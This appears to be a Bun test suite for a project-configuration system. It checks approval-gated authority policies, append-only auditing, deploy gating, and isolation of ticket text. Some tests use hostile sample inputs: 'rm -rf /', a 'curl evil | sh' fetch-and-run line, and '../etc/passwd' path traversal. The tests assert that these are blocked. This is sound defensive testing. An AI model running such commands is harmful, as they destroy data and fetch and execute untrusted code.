import { afterAll, afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { config } from "../src/config.ts";
import {
  openTestDatabase, closeTestDatabase, migrate,
  ensureProjectRow, getProjectRowByName, listProjectRows, updateProjectDescriptive,
  replaceProjectRepos, listProjectRepos,
  upsertProjectModel, deleteProjectModel, listProjectModels,
  upsertProjectGroundskeeper, listProjectGroundskeepers, projectGroundskeeperRowsForCard,
  insertPendingPolicy, getProjectPolicy, listProjectPolicies, activePoliciesByProjectName,
  approveProjectPolicy, rejectProjectPolicy, listProjectAudit,
} from "../src/db.ts";
import { pgliteStore, type Store } from "../src/store.ts";
import { loadProjects, effectiveProjects, effectiveProjectForRepo, applyPolicyOverlay } from "../src/registry.ts";
import { projectGroundskeeperGate } from "../src/groundskeepers.ts";
import {
  validatePolicyValue, validateProjectModels, syncProjectsFromCards, projectsView,
  saveProjectDescriptive, setProjectModel, setProjectGroundskeeper,
  proposeProjectPolicy, approvePolicyItem, rejectPolicyItem, AUTHORITY_KEYS,
} from "../src/project-config.ts";
import { deployAndVerify } from "../src/postmerge.ts";

// Issue #7 invariants, pinned:
//   1. AUTHORITY fields (repos/deploy/smoke/deployEnabled/merge) cannot take
//      effect without an approval — a propose lands 'pending' and the daemon
//      keeps using the card until the atomic claim activates it.
//   2. Exactly one 'active' policy per (project, key) — tested against the
//      partial unique index ITSELF, not just the code path.
//   3. The approval claim is atomic (double-click cannot double-apply).
//   4. project_config_audit is append-only (trigger-enforced) and every
//      mutation helper writes an audit row in the same statement as the change.
//   5. deployEnabled still fails closed, and DEPLOY_ENABLED=0 overrides
//      everything below it.
//   6. project_models validates against config.models on read (unknown model
//      dropped with a warning — meta.ts discipline).
//   7. Ticket text cannot reach any config field (static lint: no
//      ticket-consuming module references a project-config writer).
//   8. Per-project groundskeeper enabled=true alone does not arm a card; a
//      row can only veto (third gate, AND-ed, never a bypass).
//   9. A factory with no rows behaves exactly as cards alone (additive-only).

let dir = "";
const originalProjectsDir = config.projectsDir;

const writeCard = (name: string, lines: string[]) => writeFileSync(join(dir, `${name}.md`), lines.join("\n"));
const kiwiCard = () => writeCard("kiwi", [
  "---", "name: kiwi", "team: FAC", "repos: [acme/kiwi, acme/kiwi-api]", "merge: review",
  "deploy: echo deploy-from-card", "smoke: echo smoke-from-card", "deployEnabled: false", "---", "", "Kiwi notes.",
]);

beforeEach(async () => {
  dir = mkdtempSync(join(tmpdir(), "factory-projects-"));
  config.projectsDir = dir;
  await openTestDatabase();
});
afterEach(async () => {
  config.projectsDir = originalProjectsDir;
  if (dir) rmSync(dir, { recursive: true, force: true });
  await closeTestDatabase();
});

async function seedKiwi(): Promise<number> {
  kiwiCard();
  await syncProjectsFromCards();
  const row = await getProjectRowByName("kiwi");
  if (!row) throw new Error("sync did not seed the kiwi row");
  return row.id;
}

describe("card → PG sync (bootstrap/import path)", () => {
  test("seeds a projects row + one-way repos projection from the card, with audit rows", async () => {
    const id = await seedKiwi();
    const row = await getProjectRowByName("kiwi");
    expect(row?.team).toBe("FAC");
    expect(row?.status).toBe("active");
    expect(await listProjectRepos(id)).toEqual(["acme/kiwi", "acme/kiwi-api"]);
    const audit = await listProjectAudit(id);
    expect(audit.some((a) => a.field === "project:created")).toBe(true);
    expect(audit.some((a) => a.field === "repos:projection")).toBe(true);
  });

  test("re-sync is idempotent: no duplicate rows, no new audit spam", async () => {
    const id = await seedKiwi();
    const before = (await listProjectAudit(id)).length;
    await syncProjectsFromCards();
    await syncProjectsFromCards();
    expect((await listProjectRows()).length).toBe(1);
    expect((await listProjectAudit(id)).length).toBe(before);
  });

  test("the projection is reconciled FROM the card — a DB-widened set is overwritten on sync", async () => {
    const id = await seedKiwi();
    // Simulate a rogue DB edit widening the projection.
    await replaceProjectRepos(id, ["acme/kiwi", "acme/kiwi-api", "acme/stolen"], "rogue");
    await syncProjectsFromCards();
    expect(await listProjectRepos(id)).toEqual(["acme/kiwi", "acme/kiwi-api"]);
  });
});

describe("descriptive tier: immediate + audited", () => {
  test("updateProjectDescriptive applies immediately and writes old/new/actor", async () => {
    const id = await seedKiwi();
    expect(await updateProjectDescriptive(id, "goal", "ship the kiwi", "dashboard")).toBe(true);
    expect((await getProjectRowByName("kiwi"))?.goal).toBe("ship the kiwi");
    const audit = await listProjectAudit(id);
    const entry = audit.find((a) => a.field === "goal");
    expect(entry?.oldValue).toBe('""');
    expect(entry?.newValue).toBe('"ship the kiwi"');
    expect(entry?.actor).toBe("dashboard");
  });

  test("a no-op edit writes NO audit row (the audit records changes, not clicks)", async () => {
    const id = await seedKiwi();
    await updateProjectDescriptive(id, "goal", "same", "dashboard");
    const before = (await listProjectAudit(id)).length;
    expect(await updateProjectDescriptive(id, "goal", "same", "dashboard")).toBe(false);
    expect((await listProjectAudit(id)).length).toBe(before);
  });

  test("every mutation helper writes an audit row — an edit with no audit row is impossible", async () => {
    const id = await seedKiwi();
    const count = async () => (await listProjectAudit(id, 500)).length;
    let before = await count();
    expect(await updateProjectDescriptive(id, "description", "d", "a1")).toBe(true);
    expect(await count()).toBe(before + 1);
    before = await count();
    expect(await upsertProjectModel(id, "fixer", config.models.fixer, null, "a2")).toBe(true);
    expect(await count()).toBe(before + 1);
    before = await count();
    expect(await deleteProjectModel(id, "fixer", "a3")).toBe(true);
    expect(await count()).toBe(before + 1);
    before = await count();
    expect(await upsertProjectGroundskeeper(id, "factory", false, null, "a4")).toBe(true);
    expect(await count()).toBe(before + 1);
    before = await count();
    expect(await insertPendingPolicy(id, "merge", JSON.stringify("shadow"), "a5")).not.toBeNull();
    expect(await count()).toBe(before + 1);
  });
});

describe("authority tier: pending → active via atomic claim", () => {
  test("a proposed authority change does NOT take effect — the daemon keeps the card's value", async () => {
    const id = await seedKiwi();
    const policyId = await insertPendingPolicy(id, "merge", JSON.stringify("auto"), "dashboard");
    expect(policyId).not.toBeNull();
    expect((await getProjectPolicy(policyId!))?.state).toBe("pending");
    // Config in force: unchanged.
    const effective = await effectiveProjectForRepo("acme/kiwi");
    expect(effective?.merge).toBe("review");
    expect(await activePoliciesByProjectName()).toEqual([]);
  });

  test("approval activates the revision and the overlay takes force", async () => {
    const id = await seedKiwi();
    const policyId = (await insertPendingPolicy(id, "merge", JSON.stringify("shadow"), "dashboard"))!;
    const activated = await approveProjectPolicy(policyId, "owner");
    expect(activated?.state).toBe("active");
    expect((await effectiveProjectForRepo("acme/kiwi"))?.merge).toBe("shadow");
    // Audit carries the approval.
    const audit = await listProjectAudit(id);
    expect(audit.some((a) => a.field === "policy:merge:approved" && a.actor === "owner")).toBe(true);
  });

  test("the claim is atomic — a double-click cannot double-apply", async () => {
    const id = await seedKiwi();
    const policyId = (await insertPendingPolicy(id, "merge", JSON.stringify("shadow"), "dashboard"))!;
    const [first, second] = [await approveProjectPolicy(policyId, "owner"), await approveProjectPolicy(policyId, "owner")];
    expect(first?.state).toBe("active");
    expect(second).toBeNull();
  });

  test("a decided row cannot be re-decided: reject after approve refuses, approve after reject refuses", async () => {
    const id = await seedKiwi();
    const a = (await insertPendingPolicy(id, "merge", JSON.stringify("shadow"), "d"))!;
    await approveProjectPolicy(a, "owner");
    expect(await rejectProjectPolicy(a, "owner")).toBe(false);
    const b = (await insertPendingPolicy(id, "deployEnabled", JSON.stringify(true), "d"))!;
    expect(await rejectProjectPolicy(b, "owner")).toBe(true);
    expect(await approveProjectPolicy(b, "owner")).toBeNull();
    expect((await getProjectPolicy(b))?.state).toBe("rejected");
  });

  test("approving a second revision for the same key supersedes the first — exactly one active", async () => {
    const id = await seedKiwi();
    const first = (await insertPendingPolicy(id, "merge", JSON.stringify("shadow"), "d"))!;
    const second = (await insertPendingPolicy(id, "merge", JSON.stringify("auto"), "d"))!;
    await approveProjectPolicy(first, "owner");
    await approveProjectPolicy(second, "owner");
    const all = await listProjectPolicies(id);
    expect(all.find((p) => p.id === first)?.state).toBe("superseded");
    expect(all.find((p) => p.id === second)?.state).toBe("active");
    expect(all.filter((p) => p.key === "merge" && p.state === "active").length).toBe(1);
    expect((await effectiveProjectForRepo("acme/kiwi"))?.merge).toBe("auto");
  });
});

describe("the overlay itself (pure — registry.applyPolicyOverlay)", () => {
  const card = () => ({
    name: "kiwi", team: "FAC", repos: ["acme/kiwi", "acme/kiwi-api"],
    merge: "review" as const, deploy: "echo card-deploy", smoke: "echo card-smoke", deployEnabled: false,
  });

  test("repos can only NARROW — a DB row can never widen the repo set", () => {
    const out = applyPolicyOverlay(card(), { repos: ["acme/kiwi", "acme/stolen", 42] });
    expect(out.repos).toEqual(["acme/kiwi"]); // stolen dropped: not on the card
  });

  test("merge accepts only the three known values — garbage keeps the card's value", () => {
    expect(applyPolicyOverlay(card(), { merge: "superauto" }).merge).toBe("review");
    expect(applyPolicyOverlay(card(), { merge: 1 }).merge).toBe("review");
    expect(applyPolicyOverlay(card(), { merge: "auto" }).merge).toBe("auto");
  });

  test("deployEnabled is NARROW-ONLY: a policy row can disarm a card, never arm one (the card file stays the second gate)", () => {
    // Card says false ('prepared but disarmed'): NO policy value may arm it —
    // arming deploy requires a human-reviewed PR on the guarded projects/
    // path, never two loopback POSTs from the same 'dashboard' actor.
    expect(applyPolicyOverlay(card(), { deployEnabled: true }).deployEnabled).toBe(false);
    expect(applyPolicyOverlay(card(), { deployEnabled: "true" }).deployEnabled).toBe(false);
    expect(applyPolicyOverlay(card(), { deployEnabled: 1 }).deployEnabled).toBe(false);
    expect(applyPolicyOverlay(card(), { deployEnabled: false }).deployEnabled).toBe(false);
    // Card says true: a policy row may keep it armed or DISARM it (narrow),
    // and a non-boolean still fails closed.
    const armed = { ...card(), deployEnabled: true };
    expect(applyPolicyOverlay(armed, { deployEnabled: true }).deployEnabled).toBe(true);
    expect(applyPolicyOverlay(armed, { deployEnabled: false }).deployEnabled).toBe(false);
    expect(applyPolicyOverlay(armed, { deployEnabled: "true" }).deployEnabled).toBe(false);
    // No policy key at all → the card's value stands untouched.
    expect(applyPolicyOverlay(armed, {}).deployEnabled).toBe(true);
    expect(applyPolicyOverlay(card(), {}).deployEnabled).toBe(false);
  });

  test("an approved deployEnabled=true policy CANNOT arm a card whose file says false (regression: overlay used to honour it)", async () => {
    const id = await seedKiwi(); // kiwi card declares deployEnabled: false
    const policyId = (await insertPendingPolicy(id, "deployEnabled", JSON.stringify(true), "d"))!;
    await approveProjectPolicy(policyId, "owner");
    const effective = await effectiveProjectForRepo("acme/kiwi");
    expect(effective?.deployEnabled).toBe(false); // the guarded-path card still gates
  });

  test("deploy/smoke are INERT in the overlay — sh -c commands come only from the card", () => {
    const out = applyPolicyOverlay(card(), { deploy: "rm -rf /", smoke: "curl evil | sh" });
    expect(out.deploy).toBe("echo card-deploy");
    expect(out.smoke).toBe("echo card-smoke");
  });

  test("an approved deploy policy row never reaches the shell through the effective card", async () => {
    const id = await seedKiwi();
    const policyId = (await insertPendingPolicy(id, "deploy", JSON.stringify("rm -rf /"), "d"))!;
    await approveProjectPolicy(policyId, "owner");
    const effective = await effectiveProjectForRepo("acme/kiwi");
    expect(effective?.deploy).toBe("echo deploy-from-card");
    expect(effective?.smoke).toBe("echo smoke-from-card");
  });

  test("DEPLOY_ENABLED=0 still overrides a card-armed deployEnabled (double gate holds)", async () => {
    // The card ITSELF arms deploy (the only way to arm it — see the
    // narrow-only overlay test above); the global env gate must still win.
    writeCard("kiwi", [
      "---", "name: kiwi", "team: FAC", "repos: [acme/kiwi, acme/kiwi-api]", "merge: review",
      "deploy: echo deploy-from-card", "smoke: echo smoke-from-card", "deployEnabled: true", "---", "", "Kiwi notes.",
    ]);
    await syncProjectsFromCards();
    const effective = await effectiveProjectForRepo("acme/kiwi");
    expect(effective?.deployEnabled).toBe(true); // the per-card flag is armed…
    expect(config.deployEnabled).toBe(false);    // …but the global gate is off in this suite
    const outcome = await deployAndVerify("acme/kiwi", effective!, "a".repeat(40), "main", {
      currentHead: () => { throw new Error("must not be reached — global gate is off"); },
      workspace: () => { throw new Error("unreachable"); },
      shell: () => { throw new Error("unreachable"); },
      isAutoRepo: () => false,
      revertMerge: () => { throw new Error("unreachable"); },
      createRevertPr: () => { throw new Error("unreachable"); },
      escalate: () => { throw new Error("unreachable"); },
    });
    expect(outcome.stage).toBe("skipped");
  });
});

describe("additive-only fallback (fresh checkout)", () => {
  test("no PG rows → effectiveProjects is exactly loadProjects()", async () => {
    kiwiCard();
    expect(await effectiveProjects()).toEqual(loadProjects());
  });

  test("store closed → cards alone govern, helpers return safe zeros", async () => {
    kiwiCard();
    await closeTestDatabase();
    expect(await effectiveProjects()).toEqual(loadProjects());
    expect(await ensureProjectRow("kiwi", "FAC", "x")).toBeNull();
    expect(await listProjectRows()).toEqual([]);
    expect(await activePoliciesByProjectName()).toEqual([]);
    expect(await projectGroundskeeperRowsForCard("factory")).toEqual([]);
    await openTestDatabase(); // afterEach closes again
  });
});

describe("database-level invariants (the constraint, not just the code path)", () => {
  let raw: Store;
  afterAll(async () => { await raw?.close(); });

  test("partial unique index: a second active row for the same (project, key) is IMPOSSIBLE", async () => {
    raw = await pgliteStore();
    await migrate(raw);
    await raw.exec("INSERT INTO projects (name, goal, description, team, status, created_at, updated_at) VALUES ('c1', '', '', 'FAC', 'active', 1, 1)");
    const rows = await raw.query<{ id: number }>("SELECT id::int AS id FROM projects WHERE name = 'c1'");
    const pid = rows[0]!.id;
    await raw.exec("INSERT INTO project_policy (project_id, key, value, state, created_at) VALUES ($1, 'merge', '\"auto\"', 'active', 1)", [pid]);
    // Any number of pending revisions is fine…
    await raw.exec("INSERT INTO project_policy (project_id, key, value, state, created_at) VALUES ($1, 'merge', '\"shadow\"', 'pending', 2)", [pid]);
    // …but a second ACTIVE one violates the index.
    expect(raw.exec(
      "INSERT INTO project_policy (project_id, key, value, state, created_at) VALUES ($1, 'merge', '\"shadow\"', 'active', 3)", [pid],
    )).rejects.toThrow();
    // A different key may of course hold its own active row.
    await raw.exec("INSERT INTO project_policy (project_id, key, value, state, created_at) VALUES ($1, 'deployEnabled', 'true', 'active', 4)", [pid]);
  });

  test("project_config_audit is append-only: UPDATE and DELETE both raise (trigger-enforced)", async () => {
    await raw.exec("INSERT INTO project_config_audit (project_id, field, old_value, new_value, actor, at) VALUES (1, 'goal', NULL, '\"x\"', 'test', 1)");
    expect(raw.exec("UPDATE project_config_audit SET actor = 'rewritten'")).rejects.toThrow(/append-only/);
    expect(raw.exec("DELETE FROM project_config_audit")).rejects.toThrow(/append-only/);
    const rows = await raw.query<{ n: number }>("SELECT COUNT(*)::int AS n FROM project_config_audit");
    expect(rows[0]?.n).toBe(1); // the row survived both attempts
  });
});

describe("project_models roster validation (read-side, meta.ts discipline)", () => {
  test("unknown model / unknown role are dropped; unknown effort degrades to null", () => {
    const roster = { implementer: "sonnet", fixer: "sonnet", reviewerClaude: "opus" };
    const rows = [
      { role: "implementer", model: "sonnet", effort: "high" },
      { role: "fixer", model: "totally-made-up", effort: null },   // unknown model → dropped
      { role: "ghostrole", model: "sonnet", effort: null },        // unknown role → dropped
      { role: "reviewerClaude", model: "opus", effort: "turbo" },  // unknown effort → null
    ];
    const out = validateProjectModels(rows, roster);
    expect(out).toEqual([
      { role: "implementer", model: "sonnet", effort: "high" },
      { role: "reviewerClaude", model: "opus", effort: null },
    ]);
  });

  test("write path refuses an off-roster model outright", async () => {
    await seedKiwi();
    const result = await setProjectModel({ name: "kiwi", role: "fixer", model: "not-a-roster-model" });
    expect(result.status).toBe(400);
    const rejectedRole = await setProjectModel({ name: "kiwi", role: "hacker", model: config.models.fixer });
    expect(rejectedRole.status).toBe(400);
  });
});

describe("groundskeeper third gate (AND-ed, never a bypass)", () => {
  test("no rows → allowed (today's behavior exactly); any disabled row vetoes; all-true rows allow", () => {
    expect(projectGroundskeeperGate([])).toBe(true);
    expect(projectGroundskeeperGate([{ enabled: true }])).toBe(true);
    expect(projectGroundskeeperGate([{ enabled: true }, { enabled: false }])).toBe(false);
    expect(projectGroundskeeperGate([{ enabled: false }])).toBe(false);
  });

  test("enabled=true alone does not arm a card — the gate is only consulted after both existing gates", () => {
    // The wiring in groundskeeperTick checks config.groundskeepersEnabled and
    // card.enabled BEFORE this gate; assert the tick's source keeps that order
    // so a true row can never substitute for either existing gate.
    const src = readFileSync(new URL("../src/groundskeepers.ts", import.meta.url), "utf8");
    const globalGate = src.indexOf("if (!config.groundskeepersEnabled) return");
    const cardGate = src.indexOf(".filter((c) => c.enabled)");
    const thirdGate = src.indexOf("projectGroundskeeperGate(gateRows)");
    expect(globalGate).toBeGreaterThan(-1);
    expect(cardGate).toBeGreaterThan(globalGate);
    expect(thirdGate).toBeGreaterThan(cardGate);
  });

  test("rows round-trip through the store per card name", async () => {
    const id = await seedKiwi();
    await upsertProjectGroundskeeper(id, "factory", false, "weekly", "dashboard");
    expect(await projectGroundskeeperRowsForCard("factory")).toEqual([{ enabled: false }]);
    expect(await projectGroundskeeperRowsForCard("other-card")).toEqual([]);
    expect(await listProjectGroundskeepers(id)).toEqual([{ card: "factory", enabled: false, cadence: "weekly" }]);
  });
});

describe("policy value validation (pure)", () => {
  test("unknown keys are refused — the authority set is an in-code constant", () => {
    expect(AUTHORITY_KEYS).toEqual(["repos", "deploy", "smoke", "deployEnabled", "merge"]);
    expect(validatePolicyValue("budget", 1_000_000).ok).toBe(false);
    expect(validatePolicyValue("", "x").ok).toBe(false);
  });

  test("repos entries must be org/name; merge must be the enum; deployEnabled a bare boolean", () => {
    expect(validatePolicyValue("repos", ["acme/kiwi"]).ok).toBe(true);
    expect(validatePolicyValue("repos", ["../etc/passwd"]).ok).toBe(false);
    expect(validatePolicyValue("repos", "acme/kiwi").ok).toBe(false);
    expect(validatePolicyValue("merge", "auto").ok).toBe(true);
    expect(validatePolicyValue("merge", "superauto").ok).toBe(false);
    expect(validatePolicyValue("deployEnabled", true).ok).toBe(true);
    expect(validatePolicyValue("deployEnabled", "true").ok).toBe(false);
    expect(validatePolicyValue("deployEnabled", 1).ok).toBe(false);
  });
});

describe("handler-level two-tier enforcement", () => {
  test("saveProjectDescriptive refuses authority fields outright", async () => {
    await seedKiwi();
    const result = await saveProjectDescriptive({ name: "kiwi", goal: "g", merge: "auto" });
    expect(result.status).toBe(400);
    expect(String((result.json as { error: string }).error)).toContain("authority");
    // And nothing changed nor landed pending.
    expect((await getProjectRowByName("kiwi"))?.goal).toBe("");
    const row = await getProjectRowByName("kiwi");
    expect(await listProjectPolicies(row!.id)).toEqual([]);
  });

  test("propose → approve → reject flow through the handlers (approve bound to the reviewed {key, value})", async () => {
    await seedKiwi();
    const proposed = await proposeProjectPolicy({ name: "kiwi", key: "merge", value: "shadow" });
    expect(proposed.status).toBe(200);
    const policyId = (proposed.json as { policyId: number }).policyId;
    expect((await effectiveProjectForRepo("acme/kiwi"))?.merge).toBe("review"); // still pending
    expect((await approvePolicyItem(policyId, { key: "merge", value: "shadow" })).status).toBe(200);
    expect((await approvePolicyItem(policyId, { key: "merge", value: "shadow" })).status).toBe(409); // double-click
    expect((await rejectPolicyItem(policyId)).status).toBe(409);  // already decided
    expect((await effectiveProjectForRepo("acme/kiwi"))?.merge).toBe("shadow");
    expect((await approvePolicyItem(999_999, { key: "merge", value: "shadow" })).status).toBe(404);
  });

  test("approve is evidence-bound: a blind or mismatched approve-by-id refuses and activates NOTHING", async () => {
    await seedKiwi();
    const proposed = await proposeProjectPolicy({ name: "kiwi", key: "merge", value: "auto" });
    const policyId = (proposed.json as { policyId: number }).policyId;
    // Blind approve (no evidence) → 400, never applied.
    expect((await approvePolicyItem(policyId, {})).status).toBe(400);
    expect((await approvePolicyItem(policyId, undefined)).status).toBe(400);
    // Wrong value / wrong key → 409, never applied.
    expect((await approvePolicyItem(policyId, { key: "merge", value: "shadow" })).status).toBe(409);
    expect((await approvePolicyItem(policyId, { key: "deployEnabled", value: "auto" })).status).toBe(409);
    expect((await effectiveProjectForRepo("acme/kiwi"))?.merge).toBe("review"); // untouched throughout
    expect((await getProjectPolicy(policyId))?.state).toBe("pending");
    // The matching evidence still works.
    expect((await approvePolicyItem(policyId, { key: "merge", value: "auto" })).status).toBe(200);
  });

  test("proposing a new revision SUPERSEDES the earlier pending one — a never-rendered pending cannot be activated by id", async () => {
    // The dashboard renders only the NEWEST pending revision per key, so an
    // older pending row would be invisible yet approvable. Regression for the
    // deployEnabled retract scenario: propose true, think better of it,
    // propose false — the retracted true must be dead, not lurking.
    const id = await seedKiwi();
    const first = (await insertPendingPolicy(id, "merge", JSON.stringify("auto"), "d"))!;
    const second = (await insertPendingPolicy(id, "merge", JSON.stringify("review"), "d"))!;
    expect((await getProjectPolicy(first))?.state).toBe("superseded");
    expect((await getProjectPolicy(second))?.state).toBe("pending");
    // The stale id refuses even WITH matching evidence — it is no longer pending.
    expect((await approvePolicyItem(first, { key: "merge", value: "auto" })).status).toBe(409);
    expect(await approveProjectPolicy(first, "owner")).toBeNull();
    expect(await activePoliciesByProjectName()).toEqual([]); // nothing took force
    // Only the newest pending remains for the key.
    const all = await listProjectPolicies(id);
    expect(all.filter((p) => p.key === "merge" && p.state === "pending").map((p) => p.id)).toEqual([second]);
    // Different keys never supersede each other.
    const other = (await insertPendingPolicy(id, "repos", JSON.stringify(["acme/kiwi"]), "d"))!;
    expect((await getProjectPolicy(second))?.state).toBe("pending");
    expect((await getProjectPolicy(other))?.state).toBe("pending");
  });

  test("unknown project (no card, no row) → 404; groundskeeper toggle refuses coerced booleans", async () => {
    await seedKiwi();
    expect((await saveProjectDescriptive({ name: "ghost", goal: "g" })).status).toBe(404);
    expect((await setProjectGroundskeeper({ name: "kiwi", card: "factory", enabled: "true" })).status).toBe(400);
    expect((await setProjectGroundskeeper({ name: "kiwi", card: "../etc", enabled: true })).status).toBe(400);
  });

  test("projectsView reflects rows, pending policies and audit; storeless view degrades to cards", async () => {
    await seedKiwi();
    await saveProjectDescriptive({ name: "kiwi", goal: "ship it" });
    await proposeProjectPolicy({ name: "kiwi", key: "merge", value: "auto" });
    const view = await projectsView();
    expect(view.projects).toHaveLength(1);
    const p = view.projects[0]!;
    expect(p.goal).toBe("ship it");
    expect(p.repos).toEqual(["acme/kiwi", "acme/kiwi-api"]);
    expect(p.policies.some((pp) => pp.key === "merge" && pp.state === "pending")).toBe(true);
    expect(p.effective?.merge).toBe("review"); // pending never leaks into force
    expect(p.audit.length).toBeGreaterThan(0);
  });
});

// -----------------------------------------------------------------------------
// Untrusted-input lint: ticket text still cannot reach any config field. The
// modules that consume Linear ticket text must never reference a project-config
// WRITER — the only doors are the guarded loopback routes. Static, same style
// as tests/db-cast-discipline.test.ts.
// -----------------------------------------------------------------------------
describe("ticket text cannot reach project config (static lint)", () => {
  const WRITERS = [
    "ensureProjectRow", "updateProjectDescriptive", "replaceProjectRepos",
    "upsertProjectModel", "deleteProjectModel", "upsertProjectGroundskeeper",
    "insertPendingPolicy", "approveProjectPolicy", "rejectProjectPolicy",
    "saveProjectDescriptive", "setProjectModel", "setProjectGroundskeeper",
    "proposeProjectPolicy", "approvePolicyItem", "rejectPolicyItem", "syncProjectsFromCards",
  ];
  const TICKET_CONSUMERS = ["meta.ts", "intake.ts", "plan.ts", "loop.ts", "steward.ts", "agents.ts", "linear.ts", "groundskeepers.ts", "bootstrap.ts"];

  test("no ticket-consuming module references a project-config writer", () => {
    for (const file of TICKET_CONSUMERS) {
      const src = readFileSync(new URL(`../src/${file}`, import.meta.url), "utf8");
      for (const writer of WRITERS) {
        expect({ file, writer, found: src.includes(writer) }).toEqual({ file, writer, found: false });
      }
    }
  });

  test("the lint itself is not vacuous — the writers DO exist in db.ts / project-config.ts", () => {
    const db = readFileSync(new URL("../src/db.ts", import.meta.url), "utf8");
    const pc = readFileSync(new URL("../src/project-config.ts", import.meta.url), "utf8");
    expect(db.includes("approveProjectPolicy")).toBe(true);
    expect(pc.includes("proposeProjectPolicy")).toBe(true);
  });
});
